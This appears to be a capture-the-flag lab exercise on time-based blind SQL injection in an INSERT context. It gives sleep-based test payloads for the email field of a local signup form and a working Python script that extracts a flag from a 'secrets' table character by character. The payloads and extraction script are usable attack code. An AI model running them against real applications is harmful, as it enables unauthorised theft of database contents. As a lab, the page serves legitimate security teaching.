Objective
1. The email field is injected into an INSERT statement.
2. Confirm injection with: x@x.com' AND sleep(3)-- — if the response takes ~3s, injection works.
3. Use conditional sleep to extract the flag: x@x.com' AND IF((SELECT SUBSTR(flag,1,1) FROM secrets)='H',sleep(3),0)--
4. A response >2s means the condition is TRUE for that character.
Note: Sleep is capped at 10s per request for lab stability. Use a threshold of 2s+ to distinguish true from false.
Python Automation Helper
# Time-based extraction skeleton (INSERT context) import requests, time URL = "http://localhost:5000/lab6/signup" THRESHOLD = 2.0 # seconds def is_true(condition): # INSERT context: close string, add condition with sleep, re-close string payload = f"x@x.com' AND (SELECT CASE WHEN ({condition}) THEN sleep(3) ELSE 0 END FROM secrets) AND '1'='1" t0 = time.time() requests.post(URL, data={"email": payload}) return (time.time() - t0) > THRESHOLD flag = "" for pos in range(1, 40): for char in "HUNT{}abcdefghijklmnopqrstuvwxyz_0123456789": cond = f"SUBSTR(flag,{pos},1)='{char}'" if is_true(cond): flag += char break else: break print(f"Flag: {flag}")
